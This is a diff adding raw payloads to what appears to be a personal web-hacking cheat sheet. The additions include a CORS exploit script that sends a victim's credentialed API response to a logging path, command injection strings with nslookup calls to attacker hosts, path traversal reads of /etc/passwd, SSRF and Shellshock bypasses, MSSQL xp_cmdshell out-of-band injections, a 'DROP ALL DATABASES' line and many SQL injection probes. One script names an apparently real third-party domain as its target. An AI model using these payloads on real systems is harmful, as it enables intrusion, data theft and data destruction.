@@ -231,6 +231,21 @@ direct access to url like /Admin
 
                                                          Access-Control-Allow-Origin: https://*.normal-website.com
 
+                                                        https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
+                                                        
+                                                        
+                                                        <script>
+                                                           var req = new XMLHttpRequest();
+                                                           req.onload = reqListener;
+                                                           req.open('get','https://account-sprint.dynatracelabs.com//my/api/v1/static/resource-mappings',true);
+                                                           req.withCredentials = true;
+                                                           req.send();
+                                                        
+                                                           function reqListener() {
+                                                               location='/log?key='+this.responseText;
+                                                           };
+                                                        </script> 
+
 
 
                             14. click jacking
@@ -378,6 +393,25 @@ direct access to url like /Admin
                                                             ||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
 
 
+                                                                &
+                                                                &&
+                                                                |
+                                                                ||
+                                                                ;
+                                                                ;whoami;ls &&whoami |whoami ||whoami
+                                                                
+                                                                & ping -c 10 127.0.0.1 & 
+                                                                & whoami > /var/www/static/whoami.txt & 
+                                                                
+                                                                Purpose of command 	   Linux 			Windows
+                                                                Name of current user 	whoami 			whoami
+                                                                Operating system 		uname -a 		ver
+                                                                Network configuration 	ifconfig 		ipconfig /all
+                                                                Network connections 	netstat -an 	netstat -an
+                                                                Running processes 		ps -ef 			tasklist 
+                                                                
+                                                                & nslookup kgji2ohoyw.web-attacker.com & 
+
 
 
 
@@ -414,7 +448,12 @@ direct access to url like /Admin
                                                             UTF 
                                                             /var/www/images/../../../etc/passwd
                                                             ../../../etc/passwd%00.png
-
+                                                            filename=../../../etc/passwd 
+                                                            
+                                                            ..\..\..\windows\win.ini
+                                                            ..%c0%af or ..%252f, to bypass the input filter. 
+                                                            ../../../etc/passwd%00.png 
+                                                            ....//....//....//etc/passwd
 
                                                             
                             21. file upload
@@ -453,6 +492,19 @@ direct access to url like /Admin
                                                              URL encoding or case variation.
 
 
+                                                              stockApi=http://localhost/admin 
+                                                              stockApi=http://192.168.0.68/admin 
+                                                              Using an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1. 
+                                                              GET /api/web_resource/url?q=http://0:6000/ HTTP/1.1
+                                                              http://[0:0:0:0:0:ffff:127.0.0.1]
+                                                              Double-URL encode the # to %2523
+                                                              Change the URL to http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
+                                                              <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]> 
+                                                              https://www.youtube.com/watch?v=eW4QDUytHrY --  useragent:  () { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net referer: http://192.168.0.1:8080
+                                                              
+                                                              <?php
+                                                              header("Location: http://localhost:25");
+                                                              ?>
 
 
                             23. XXE 
@@ -849,9 +901,6 @@ space filter -  %A0 also ()
 3')%0a unIon %0a SeLecT (1),(2),(3)%0aAND  %0a ('1
 
 
-
-
-
                                                                   HTTP Parameter pollution
 
 you can try waf bypass using HPP waf will not validate extra parameter we have added and we can inject there
@@ -867,6 +916,56 @@ enode to various encoding scheme
 '  to some wierd character in UTF-16, utf-32,%bf%27,%af%27
 
 
+1'"
+'XOR(if(now()=sysdate(),sleep(10*5),0))OR'
+
+'--
+?id=1\
+admin--
+
+
+
+' or 1=1--
+
+vanilla
+
+and true /false
+1' and 1=1 , 1=2 --+
+
+sleep(10)--
+
+33; DECLARE @command varchar(255); SELECT @command='ping zknivz9q0j7isvd5izssm4i1xs3kr9.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @command; EXEC sp_SYS_ProtoOp @id=3
+
+33; DECLARE @filename varchar(255); SELECT @filename='\\'+master.sys.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.xyy334me3sujnqmbzw913bw5815gwmmab.burpcollaborator.net\ohno'; EXEC Master.dbo.xp_fileexist @filename; EXEC sp_SYS_ProtoOp @id=3"
+
+(select(0)from(select(sleep(25)))v)
+
+union based
+error based
+boolean based
+time 
+oob
+
+; DROP ALL DATABASES;
+
+';--
+
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'-- 
+
+ And 1 = sleep(2);--
+ 
+ x'||pg_sleep(10)--
+ 
+ UNION (SELECT 1,2,3 FROM dual);--%';
+ 
+ UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM INFORMATION_SCHEMA.TABLES);--
+
+
+
+order by 1,2,3 && UNION SELECT NULL-- -- to know no.of columns
+union select ----- to know which column is vulnerable
+ UNION SELECT NULL,'a',NULL,NULL-- -- to know compatable data type
 
 
 
